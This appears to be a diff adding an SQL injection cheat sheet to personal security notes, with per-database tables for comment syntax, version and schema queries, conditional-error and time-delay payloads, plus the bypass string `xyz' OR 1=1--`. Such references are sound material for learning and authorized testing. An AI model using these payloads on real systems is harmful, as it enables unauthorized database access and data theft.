@@ -85,6 +85,71 @@ Execution sink eval call error
 
 `xyz' OR 1=1--`
 
+
+### Cheatsheats
+
+|Title    | Concat  |  
+| --------- | ------------- |
+|Oracle | `'foo' \|\| 'bar'` |  
+|Microsoft | `'foo'+'bar'` |  
+|PostgreSQL | `'foo' \|\| 'bar'` |
+|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
+
+|Title    | Comments |  
+| --------- | ------------- |
+|Oracle | `--comment` |  
+|Microsoft | `--comment` or `/*comment*/` |  
+|PostgreSQL | `--comment` or `/*comment*/` |
+|MySQL | `-- comment` has to have space or `/*comment*/` or `#comment`|  
+
+|Title    | Database Version |  
+| --------- | ------------- |
+|Oracle | `SELECT banner FROM v$version` |
+|Oracle | `SELECT version FROM v$instance` |
+|Microsoft | `SELECT @@version` |  
+|PostgreSQL | `SELECT version()` |
+|MySQL | `SELECT @@version` |
+
+|Title    | Database Contents |  
+| --------- | ------------- |
+|Oracle | `SELECT * FROM all_tables` |
+|Oracle | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+|Microsoft | `SELECT * FROM information_schema.tables` |  
+|Microsoft | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` | 
+|PostgreSQL | `SELECT * FROM information_schema.tables` |
+|PostgreSQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+|MySQL | `SELECT * FROM information_schema.tables` |
+|MySQL | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+
+|Title    | Conditional Errors |  
+| --------- | ------------- |
+|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
+|Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |  
+|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
+|MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+
+|Title    | Stacked Queries |  
+| --------- | ------------- |
+|Oracle | Does not support |
+|Microsoft | `QUERY-1-HERE; QUERY-2-HERE` |  
+|PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
+|MySQL | Does not support |
+
+|Title    | Time Delays |  
+| --------- | ------------- |
+|Oracle | `dbms_pipe.receive_message(('a'),10)` |
+|Microsoft | `WAITFOR DELAY '0:0:10'` |  
+|PostgreSQL | `SELECT pg_sleep(10)` |
+|MySQL | `SELECT sleep(10)` |
+
+
+|Title    | Conditional Time Delays |  
+| --------- | ------------- |
+|Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+|Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |  
+|PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
+|MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
+
 ## Union
 
 
@@ -127,6 +192,8 @@ Concat
 |Microsoft | `'foo'+'bar'` |  
 |PostgreSQL | `'foo' \|\| 'bar'` |
 |MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
+
+### Enumeration
 
 
 
